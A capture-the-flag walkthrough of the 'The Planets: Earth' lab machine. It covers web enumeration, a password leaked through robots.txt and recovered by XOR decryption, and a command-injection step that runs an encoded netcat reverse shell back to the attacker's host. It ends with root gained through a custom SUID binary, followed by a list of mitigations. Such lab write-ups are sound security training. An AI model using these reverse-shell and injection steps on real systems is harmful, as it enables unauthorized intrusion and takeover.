The Planets: Earth — Walkthrough

Show Image Show Image Show Image

MachineThe Planets: EarthSeriesThe PlanetsAuthorSirFlashRelease Date2 Nov 2021OSLinux


🔍 Overview

Earth is a Linux machine that involves virtual host discovery, credential leakage via robots.txt, XOR decryption, command injection for a reverse shell, and privilege escalation through a misconfigured SUID binary.


1️⃣ Reconnaissance

Network Discovery

bashifconfig
netdiscover -i eth0

Target IP: 192.168.1.12

Port Scanning

bashnmap -sV -sC -v -T4 192.168.1.12

Open Ports:

PortService22/tcpSSH80/tcpHTTP443/tcpHTTPS (earth.local, terratest.earth.local)


2️⃣ Enumeration

Configure Virtual Hosts

bashsudo nano /etc/hosts

192.168.1.12 earth.local
192.168.1.12 terratest.earth.local

Directory Brute-Forcing

bashgobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/big.txt

🔎 Found: /admin

bashgobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/big.txt

🔎 Found: robots.txt

Credential Leak via robots.txt

Visited https://terratest.earth.local/robots.txt → led to testingnotes.txt, which revealed:


Username: terra
Password: XOR-encrypted
Encryption key location: testdata.txt


Both files were then pulled directly from the web server to retrieve the encrypted password and the XOR key.


3️⃣ Exploitation

XOR Decryption

Using CyberChef:


Recipe: From Hex → XOR
Applied the key retrieved from testdata.txt
Input: hex string found on the earth.local homepage
Baked to reveal the plaintext password: earthclimatechangebad4humans


Admin Panel Access

Logged into http://earth.local/admin with:


Username: terra
Password: earthclimatechangebad4humans


Access granted as the apache user, exposing the user flag at /var/earth_web/user_flag.txt.

Command Injection → Reverse Shell

The admin panel included a command execution tool vulnerable to injection.

Generate a base64-encoded reverse shell payload:

bashecho 'nc -e /bin/bash 192.168.1.10 4444' | base64

Start a listener:

bashnc -lvnp 4444

Inject the payload via the admin command tool:

bashecho '<base64_payload>' | base64 -d | bash

Shell connects back on the listener. Upgraded to a full TTY:

bashpython -c 'import pty; pty.spawn("/bin/bash")'


4️⃣ Privilege Escalation

Enumerate SUID Binaries

bashfind / -perm -u=s -type f 2>/dev/null

🔎 Found a custom SUID binary: /usr/bin/reset_root

Analyze the Binary

bash/usr/bin/reset_root

Output: RESET FAILED, ALL TRIGGERS ARE NOT PRESENT

The binary expected specific "trigger" files to exist before it would run.

Create the Missing Triggers

bashtouch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe

Re-run the Binary

bash/usr/bin/reset_root

Output: RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

Escalate to Root

bashsu root
# Password: Earth

Root flag captured at /root/root_flag.txt ✅


🛡️ Key Vulnerabilities


Directory listing — /admin was enumerable
Sensitive files exposed via robots.txt
Weak encryption — XOR is trivially reversible
Weak admin credentials
Command injection in the admin tool → RCE
Insecure SUID binary allowing controlled password resets
Weak root password set by the vulnerable binary


🩹 Mitigations


Disable directory listing on production web servers
Never expose credentials or secrets via robots.txt or public paths
Use strong, industry-standard encryption (AES, bcrypt, etc.) — not XOR
Enforce strong password policies across all accounts
Sanitize and validate all user input to prevent command injection
Audit and remove unnecessary SUID binaries
Prefer SSH key-based authentication over passwords
Deploy a Web Application Firewall (WAF)



🧰 Tools Used

nmap · gobuster · CyberChef · netcat · base64 · python (pty)

🧠 Techniques Covered

Network enumeration · Virtual host discovery · Web enumeration · XOR cryptanalysis · Command injection / RCE · Reverse shell handling · SUID binary abuse · Privilege escalation


Writeup for educational purposes. Machine solved as part of "The Planets" series.
